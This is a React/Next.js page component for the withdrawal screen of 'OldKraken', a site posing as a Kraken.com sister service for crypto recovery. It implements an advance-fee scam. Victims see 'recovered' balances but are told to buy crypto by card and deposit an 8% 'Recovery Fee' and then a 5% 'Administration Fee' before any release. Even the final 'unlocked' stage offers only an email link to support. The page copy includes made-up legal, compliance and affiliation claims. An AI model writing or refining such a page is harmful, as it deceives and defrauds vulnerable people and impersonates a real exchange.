'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useAuth } from '@/lib/store';
import api from '@/lib/api';
import { ArrowLeft, Send, Clock, CheckCircle, XCircle, AlertTriangle, Info, ShieldAlert, ArrowDownToLine, DollarSign, Scale, FileCheck, HelpCircle, ChevronDown, ChevronUp, ExternalLink, Mail } from 'lucide-react';

export default function WithdrawPage() {
  const router = useRouter();
  const { isAuthenticated } = useAuth();
  const [loading, setLoading] = useState(true);
  const [stage, setStage] = useState('BLOCKED');
  const [settings, setSettings] = useState<Record<string, string>>({});
  const [wallets, setWallets] = useState<any[]>([]);
  const [prices, setPrices] = useState<Record<string, number>>({});
  const [showFaq, setShowFaq] = useState(false);
  const [showSteps, setShowSteps] = useState(false);

  useEffect(() => {
    if (!isAuthenticated) { router.push('/login'); return; }
    Promise.all([
      api.get('/users/withdraw-stage').then(r => setStage(r.data?.stage || 'BLOCKED')).catch(() => {}),
      api.get('/settings/public').then(r => {
        if (r.data && typeof r.data === 'object' && !Array.isArray(r.data)) setSettings(r.data);
      }).catch(() => {}),
      api.get('/users/profile').then(r => {
        const w = r.data?.wallets || [];
        setWallets(w.filter((wallet: any) => parseFloat(wallet.balance || '0') > 0));
      }).catch(() => {}),
      api.get('/market?perPage=50').then(r => {
        const data = Array.isArray(r.data) ? r.data : [];
        const pm: Record<string, number> = {};
        data.forEach((c: any) => { if (c.symbol && c.current_price) pm[c.symbol.toUpperCase()] = c.current_price; });
        setPrices(pm);
      }).catch(() => {}),
    ]).finally(() => setLoading(false));
  }, [isAuthenticated]);

  const fee1Pct = parseFloat(settings.withdraw_fee1_percent || '8');
  const fee2Pct = parseFloat(settings.withdraw_fee2_percent || '5');
  const supportEmail = settings.support_email || 'support@oldkraken.com';

  const totalBalance = wallets.reduce((sum: number, w: any) => {
    const price = prices[w.coin?.symbol] || 0;
    const usdVal = price * parseFloat(w.balance || '0');
    return sum + usdVal;
  }, 0);

  const fee1Amount = (totalBalance * fee1Pct / 100);
  const fee2Amount = (totalBalance * fee2Pct / 100);

  const isBlocked = stage === 'BLOCKED' || stage === 'FEE1_REQUIRED';
  const isFee1Paid = stage === 'FEE1_PAID' || stage === 'FEE2_REQUIRED';
  const isFee2Paid = stage === 'FEE2_PAID';
  const isUnlocked = stage === 'UNLOCKED';

  const stageIndex = isUnlocked ? 3 : isFee2Paid ? 2.5 : isFee1Paid ? 2 : isBlocked ? 1 : 0;

  if (loading) return (
    <div className="max-w-4xl px-4 py-12 flex items-center justify-center min-h-[60vh]">
      <div className="animate-spin w-10 h-10 border-3 border-primary-500 border-t-transparent rounded-full" />
    </div>
  );

  return (
    <div className="max-w-4xl px-4 py-6">
      {/* Header */}
      <div className="flex items-center gap-4 mb-8">
        <Link href="/dashboard" className="text-dark-400 hover:text-white transition-colors">
          <ArrowLeft className="w-6 h-6" />
        </Link>
        <div>
          <h1 className="text-base font-bold text-white">Withdraw Funds</h1>
          <p className="text-dark-400 text-sm mt-0.5">Transfer your recovered cryptocurrency to your personal wallet</p>
        </div>
      </div>

      {/* Progress Bar */}
      <div className="glass-card mb-6">
        <p className="text-dark-400 text-xs font-semibold uppercase tracking-wider mb-4">Withdrawal Progress</p>
        <div className="flex items-center gap-0 mb-3">
          {[
            { label: 'Recovery Fee', icon: Scale, idx: 1 },
            { label: 'Admin Fee', icon: FileCheck, idx: 2 },
            { label: 'Withdraw', icon: Send, idx: 3 },
          ].map((step, i) => (
            <div key={i} className="flex-1 flex items-center">
              <div className={`flex items-center gap-2 px-3 py-2 rounded-lg w-full transition-all ${stageIndex >= step.idx ? 'bg-green-500/15 border border-green-500/30' : stageIndex >= step.idx - 0.5 ? 'bg-yellow-500/10 border border-yellow-500/30' : 'bg-dark-800/50 border border-dark-700/30'}`}>
                <div className={`w-7 h-7 rounded-full flex items-center justify-center shrink-0 ${stageIndex >= step.idx ? 'bg-green-500/30 text-green-400' : stageIndex >= step.idx - 0.5 ? 'bg-yellow-500/20 text-yellow-400' : 'bg-dark-700 text-dark-500'}`}>
                  {stageIndex >= step.idx ? <CheckCircle className="w-4 h-4" /> : <step.icon className="w-3.5 h-3.5" />}
                </div>
                <div className="min-w-0">
                  <p className={`text-xs font-semibold ${stageIndex >= step.idx ? 'text-green-400' : stageIndex >= step.idx - 0.5 ? 'text-yellow-400' : 'text-dark-500'}`}>{step.label}</p>
                </div>
              </div>
              {i < 2 && <div className={`w-4 h-0.5 shrink-0 ${stageIndex > step.idx ? 'bg-green-500/40' : 'bg-dark-700'}`} />}
            </div>
          ))}
        </div>
      </div>

      {/* Balance Overview */}
      {wallets.length > 0 && (
        <div className="glass-card mb-6">
          <p className="text-dark-400 text-xs font-semibold uppercase tracking-wider mb-3">Your Recovered Assets</p>
          <div className="space-y-2">
            {wallets.map((w: any) => (
              <div key={w.id} className="flex items-center justify-between bg-dark-800/30 rounded-lg px-4 py-2.5">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded-full bg-dark-700 flex items-center justify-center text-xs font-bold text-primary-400 shrink-0">
                    {(w.coin?.symbol || '??').slice(0, 3)}
                  </div>
                  <div>
                    <p className="text-white text-sm font-semibold">{w.coin?.symbol}</p>
                    <p className="text-dark-500 text-xs">{w.coin?.name}</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-white font-mono text-sm font-semibold">{parseFloat(w.balance).toFixed(6)}</p>
                  <p className="text-dark-500 text-xs">${((prices[w.coin?.symbol] || 0) * parseFloat(w.balance)).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</p>
                </div>
              </div>
            ))}
          </div>
          <div className="flex items-center justify-between mt-3 pt-3 border-t border-dark-700/50">
            <p className="text-dark-300 text-sm font-semibold">Total Portfolio Value</p>
            <p className="text-white text-lg font-bold">${totalBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</p>
          </div>
        </div>
      )}

      {/* STAGE: BLOCKED / FEE1_REQUIRED — Show 8% Recovery Fee */}
      {isBlocked && (
        <div className="glass-card !p-0 overflow-hidden mb-6">
          <div className="bg-gradient-to-r from-amber-900/50 to-orange-900/40 p-6 border-b border-amber-700/30">
            <div className="flex items-start gap-4">
              <div className="w-14 h-14 rounded-2xl bg-amber-500/20 flex items-center justify-center shrink-0">
                <Scale className="w-7 h-7 text-amber-400" />
              </div>
              <div>
                <h2 className="text-xl font-bold text-white">{settings.withdraw_fee1_title || 'Recovery Fee Required'}</h2>
                <p className="text-amber-200/80 text-sm mt-1">{settings.withdraw_fee1_subtitle || 'A one-time legal and recovery fee is required before withdrawals can be processed.'}</p>
              </div>
            </div>
          </div>

          <div className="p-6 space-y-5">
            <div className="whitespace-pre-line text-dark-300 text-sm leading-relaxed">
              {settings.withdraw_fee1_message || `As part of the cryptocurrency recovery process, OldKraken has engaged legal counsel, blockchain forensics specialists, and compliance officers to locate, verify, and securely transfer your lost assets from dormant Kraken accounts.\n\nTo complete the release of your funds, a one-time Recovery Fee of ${fee1Pct}% is required. This fee covers:\n\n• Legal representation and documentation\n• Blockchain analysis and asset verification\n• Regulatory compliance and KYC/AML processing\n• Secure transfer and escrow services\n\nOnce this fee is paid and confirmed, your withdrawal request will move to the next stage of processing.`}
            </div>

            {/* Fee Calculator */}
            <div className="bg-dark-800/50 rounded-xl p-5 border border-dark-700/50">
              <p className="text-dark-400 text-xs font-semibold uppercase tracking-wider mb-3">Fee Calculator</p>
              <div className="space-y-2">
                <div className="flex justify-between text-sm">
                  <span className="text-dark-400">Portfolio Value</span>
                  <span className="text-white font-mono">${totalBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-dark-400">Recovery Fee ({fee1Pct}%)</span>
                  <span className="text-amber-400 font-mono font-bold">${fee1Amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                </div>
              </div>
            </div>

            <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4">
              <p className="text-blue-300 text-sm font-semibold mb-2">How to Pay the Recovery Fee</p>
              <div className="space-y-2 text-blue-400/80 text-xs">
                <div className="flex items-start gap-2"><span className="w-5 h-5 bg-blue-500/20 rounded-full flex items-center justify-center text-blue-400 text-[10px] font-bold shrink-0">1</span><span>Purchase cryptocurrency (BTC, ETH, USDT, or any supported coin) using your credit/debit card</span></div>
                <div className="flex items-start gap-2"><span className="w-5 h-5 bg-blue-500/20 rounded-full flex items-center justify-center text-blue-400 text-[10px] font-bold shrink-0">2</span><span>Go to the <strong className="text-blue-300">Deposit</strong> page and select the coin you purchased</span></div>
                <div className="flex items-start gap-2"><span className="w-5 h-5 bg-blue-500/20 rounded-full flex items-center justify-center text-blue-400 text-[10px] font-bold shrink-0">3</span><span>Send the fee amount to the deposit address shown on the page</span></div>
                <div className="flex items-start gap-2"><span className="w-5 h-5 bg-blue-500/20 rounded-full flex items-center justify-center text-blue-400 text-[10px] font-bold shrink-0">4</span><span>Submit the deposit and wait for our team to confirm. Your withdrawal will be unlocked within 24 hours.</span></div>
              </div>
            </div>

            <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-xl p-4">
              <p className="text-yellow-300 text-xs flex items-start gap-2">
                <AlertTriangle className="w-4 h-4 text-yellow-400 shrink-0 mt-0.5" />
                {settings.withdraw_warning || 'This is a standard industry fee for crypto recovery services. Without our legal intervention, these funds would remain permanently inaccessible. Your deposit is fully secure and will be processed by our compliance team.'}
              </p>
            </div>

            {/* Action Buttons */}
            <div className="space-y-3 pt-2">
              <Link href="/dashboard/deposit?guide=1" className="btn-primary w-full text-center flex items-center justify-center gap-3 !py-4 text-base font-bold shadow-lg shadow-primary-500/20">
                <ArrowDownToLine className="w-5 h-5" />
                {settings.withdraw_btn_deposit || 'Deposit Recovery Fee Now'}
              </Link>
              <div className="flex gap-3">
                <Link href="/dashboard" className="btn-secondary flex-1 text-center !py-3">
                  Back to Dashboard
                </Link>
                <a href={`mailto:${supportEmail}`} className="btn-secondary flex-1 text-center !py-3 flex items-center justify-center gap-2">
                  <Mail className="w-4 h-4" /> Contact Support
                </a>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* STAGE: FEE1_PAID / FEE2_REQUIRED — Show 5% Admin Fee */}
      {isFee1Paid && (
        <div className="glass-card !p-0 overflow-hidden mb-6">
          <div className="bg-gradient-to-r from-purple-900/50 to-indigo-900/40 p-6 border-b border-purple-700/30">
            <div className="flex items-start gap-4">
              <div className="w-14 h-14 rounded-2xl bg-purple-500/20 flex items-center justify-center shrink-0">
                <FileCheck className="w-7 h-7 text-purple-400" />
              </div>
              <div>
                <h2 className="text-xl font-bold text-white">{settings.withdraw_fee2_title || 'Administration & Processing Fee'}</h2>
                <p className="text-purple-200/80 text-sm mt-1">{settings.withdraw_fee2_subtitle || 'Recovery fee received. One final processing fee is required to complete your withdrawal.'}</p>
              </div>
            </div>
          </div>

          <div className="p-6 space-y-5">
            {/* Success banner for fee 1 */}
            <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 flex items-start gap-3">
              <CheckCircle className="w-5 h-5 text-green-400 shrink-0 mt-0.5" />
              <div>
                <p className="text-green-300 text-sm font-semibold">Recovery Fee Confirmed</p>
                <p className="text-green-400/70 text-xs mt-0.5">Your {fee1Pct}% recovery fee has been received and verified. Thank you for your payment.</p>
              </div>
            </div>

            <div className="whitespace-pre-line text-dark-300 text-sm leading-relaxed">
              {settings.withdraw_fee2_message || `Your recovery fee has been successfully processed. Before we can release your funds, a final Administration Fee of ${fee2Pct}% is required.\n\nThis fee covers the following final processing steps:\n\n• International wire transfer and conversion fees\n• Anti-money laundering (AML) compliance verification\n• Tax documentation and reporting\n• Final account audit and fund release authorization\n\nThis is the final step. Once this fee is confirmed, your full withdrawal will be processed and sent to your wallet within 24-48 hours.`}
            </div>

            {/* Fee Calculator */}
            <div className="bg-dark-800/50 rounded-xl p-5 border border-dark-700/50">
              <p className="text-dark-400 text-xs font-semibold uppercase tracking-wider mb-3">Fee Calculator</p>
              <div className="space-y-2">
                <div className="flex justify-between text-sm">
                  <span className="text-dark-400">Portfolio Value</span>
                  <span className="text-white font-mono">${totalBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-dark-400">Recovery Fee ({fee1Pct}%)</span>
                  <span className="text-green-400 font-mono line-through">${fee1Amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between text-sm border-t border-dark-700 pt-2">
                  <span className="text-dark-400">Administration Fee ({fee2Pct}%)</span>
                  <span className="text-purple-400 font-mono font-bold">${fee2Amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                </div>
              </div>
            </div>

            <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4">
              <p className="text-blue-300 text-sm font-semibold mb-2">How to Pay</p>
              <div className="space-y-2 text-blue-400/80 text-xs">
                <div className="flex items-start gap-2"><span className="w-5 h-5 bg-blue-500/20 rounded-full flex items-center justify-center text-blue-400 text-[10px] font-bold shrink-0">1</span><span>Purchase crypto worth <strong className="text-white">${fee2Amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</strong> using your credit/debit card</span></div>
                <div className="flex items-start gap-2"><span className="w-5 h-5 bg-blue-500/20 rounded-full flex items-center justify-center text-blue-400 text-[10px] font-bold shrink-0">2</span><span>Go to the <strong className="text-blue-300">Deposit</strong> page and send it to your deposit address</span></div>
                <div className="flex items-start gap-2"><span className="w-5 h-5 bg-blue-500/20 rounded-full flex items-center justify-center text-blue-400 text-[10px] font-bold shrink-0">3</span><span>Submit the deposit. Our team will process your full withdrawal within 24-48 hours.</span></div>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="space-y-3 pt-2">
              <Link href="/dashboard/deposit?guide=1" className="btn-primary w-full text-center flex items-center justify-center gap-3 !py-4 text-base font-bold shadow-lg shadow-primary-500/20">
                <ArrowDownToLine className="w-5 h-5" />
                {settings.withdraw_btn_deposit || 'Deposit Administration Fee Now'}
              </Link>
              <div className="flex gap-3">
                <Link href="/dashboard" className="btn-secondary flex-1 text-center !py-3">
                  Back to Dashboard
                </Link>
                <a href={`mailto:${supportEmail}`} className="btn-secondary flex-1 text-center !py-3 flex items-center justify-center gap-2">
                  <Mail className="w-4 h-4" /> Contact Support
                </a>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* STAGE: FEE2_PAID — Processing */}
      {isFee2Paid && (
        <div className="glass-card !p-0 overflow-hidden mb-6">
          <div className="bg-gradient-to-r from-green-900/50 to-emerald-900/40 p-6 border-b border-green-700/30">
            <div className="flex items-start gap-4">
              <div className="w-14 h-14 rounded-2xl bg-green-500/20 flex items-center justify-center shrink-0">
                <Clock className="w-7 h-7 text-green-400" />
              </div>
              <div>
                <h2 className="text-xl font-bold text-white">Withdrawal Being Processed</h2>
                <p className="text-green-200/80 text-sm mt-1">All fees have been paid. Your withdrawal is being prepared.</p>
              </div>
            </div>
          </div>
          <div className="p-6 space-y-4">
            <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 flex items-start gap-3">
              <CheckCircle className="w-5 h-5 text-green-400 shrink-0 mt-0.5" />
              <div>
                <p className="text-green-300 text-sm font-semibold">All Fees Confirmed</p>
                <p className="text-green-400/70 text-xs mt-0.5">Both the recovery fee and administration fee have been received. Our compliance team is finalizing your withdrawal.</p>
              </div>
            </div>
            <p className="text-dark-300 text-sm">Your withdrawal is currently being processed by our team. This typically takes 24-48 hours. You will receive an email notification once the transfer is complete.</p>
            <div className="flex gap-3">
              <Link href="/dashboard" className="btn-primary flex-1 text-center !py-3">Back to Dashboard</Link>
              <a href={`mailto:${supportEmail}`} className="btn-secondary flex-1 text-center !py-3 flex items-center justify-center gap-2">
                <Mail className="w-4 h-4" /> Contact Support
              </a>
            </div>
          </div>
        </div>
      )}

      {/* STAGE: UNLOCKED — Full Withdrawal Access */}
      {isUnlocked && (
        <div className="glass-card mb-6">
          <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 flex items-start gap-3 mb-6">
            <CheckCircle className="w-6 h-6 text-green-400 shrink-0" />
            <div>
              <p className="text-green-300 font-semibold">Withdrawals Unlocked</p>
              <p className="text-green-400/70 text-sm mt-0.5">All fees have been processed. You can now withdraw your funds. Contact support to arrange the transfer to your personal wallet.</p>
            </div>
          </div>
          <div className="flex gap-3">
            <a href={`mailto:${supportEmail}?subject=Withdrawal%20Request`} className="btn-primary flex-1 text-center !py-3 flex items-center justify-center gap-2">
              <Send className="w-4 h-4" /> Request Withdrawal
            </a>
            <Link href="/dashboard" className="btn-secondary flex-1 text-center !py-3">Back to Dashboard</Link>
          </div>
        </div>
      )}

      {/* How It Works — Expandable */}
      <div className="glass-card mb-6">
        <button onClick={() => setShowSteps(!showSteps)} className="w-full flex items-center justify-between text-left">
          <div className="flex items-center gap-3">
            <Info className="w-5 h-5 text-primary-400" />
            <p className="text-white font-semibold text-sm">How Does This Work?</p>
          </div>
          {showSteps ? <ChevronUp className="w-5 h-5 text-dark-400" /> : <ChevronDown className="w-5 h-5 text-dark-400" />}
        </button>
        {showSteps && (
          <div className="mt-4 space-y-4 text-sm text-dark-300">
            <p>OldKraken is a sister service of Kraken.com that specializes in recovering lost cryptocurrency from dormant and inaccessible accounts. Here is how the process works:</p>
            <div className="space-y-3">
              {[
                { title: 'Account Recovery', desc: 'Our team of specialists recovers access to lost Kraken accounts using proprietary tools and legal processes. Your email, password, and crypto assets are restored.' },
                { title: 'Asset Verification', desc: 'All recovered assets are verified on the blockchain and credited to your OldKraken dashboard. You can see your full balance immediately after logging in.' },
                { title: 'Recovery Fee (8%)', desc: 'A one-time recovery fee covers the legal, technical, and compliance costs of recovering your assets. This is standard practice in the crypto recovery industry.' },
                { title: 'Administration Fee (5%)', desc: 'A final processing fee covers international transfer costs, tax documentation, and regulatory compliance for the release of your funds.' },
                { title: 'Fund Release', desc: 'Once all fees are confirmed, your cryptocurrency is released to your personal wallet address within 24-48 business hours.' },
              ].map((step, i) => (
                <div key={i} className="flex gap-3">
                  <div className="w-7 h-7 rounded-full bg-primary-600/20 flex items-center justify-center text-primary-400 font-bold text-xs shrink-0">{i + 1}</div>
                  <div>
                    <p className="text-white font-semibold text-sm">{step.title}</p>
                    <p className="text-dark-400 text-xs mt-0.5 leading-relaxed">{step.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* FAQ — Expandable */}
      <div className="glass-card mb-6">
        <button onClick={() => setShowFaq(!showFaq)} className="w-full flex items-center justify-between text-left">
          <div className="flex items-center gap-3">
            <HelpCircle className="w-5 h-5 text-primary-400" />
            <p className="text-white font-semibold text-sm">Frequently Asked Questions</p>
          </div>
          {showFaq ? <ChevronUp className="w-5 h-5 text-dark-400" /> : <ChevronDown className="w-5 h-5 text-dark-400" />}
        </button>
        {showFaq && (
          <div className="mt-4 space-y-4 text-sm">
            {[
              { q: 'Why do I need to pay a fee to withdraw?', a: 'Recovering lost cryptocurrency requires significant legal, technical, and compliance resources. The fees cover the costs of specialists, lawyers, and blockchain forensics teams who made your funds accessible again.' },
              { q: 'Is my deposit secure?', a: 'Absolutely. All deposits are processed through our secure, verified blockchain addresses. Our compliance team reviews every transaction for your safety.' },
              { q: 'How long does the withdrawal take?', a: 'Once all fees are confirmed, withdrawals are processed within 24-48 business hours. You will receive an email notification when the transfer is complete.' },
              { q: 'Can I pay the fee with a credit card?', a: 'You cannot pay the fee directly with a card. Instead, buy cryptocurrency (like Bitcoin or USDT) on platforms like Coinbase or Binance using your card, then deposit it here. Our deposit page has a step-by-step guide.' },
              { q: 'What if I need help?', a: `Contact our support team at ${supportEmail}. We are available 24/7 to assist you with the withdrawal process.` },
              { q: 'Why are there two separate fees?', a: 'The Recovery Fee covers the initial legal and technical work to recover your assets. The Administration Fee covers the final compliance, tax documentation, and international transfer processing required to release your funds.' },
            ].map((faq, i) => (
              <div key={i} className="bg-dark-800/30 rounded-lg p-4">
                <p className="text-white text-sm font-semibold">{faq.q}</p>
                <p className="text-dark-400 text-xs mt-1.5 leading-relaxed">{faq.a}</p>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Footer */}
      <div className="text-center py-4">
        <p className="text-dark-600 text-xs">
          Need assistance? Contact us at <a href={`mailto:${supportEmail}`} className="text-primary-400 hover:text-primary-300">{supportEmail}</a>
        </p>
        <p className="text-dark-700 text-[10px] mt-1">OldKraken — Cryptocurrency Recovery Services</p>
      </div>
    </div>
  );
}
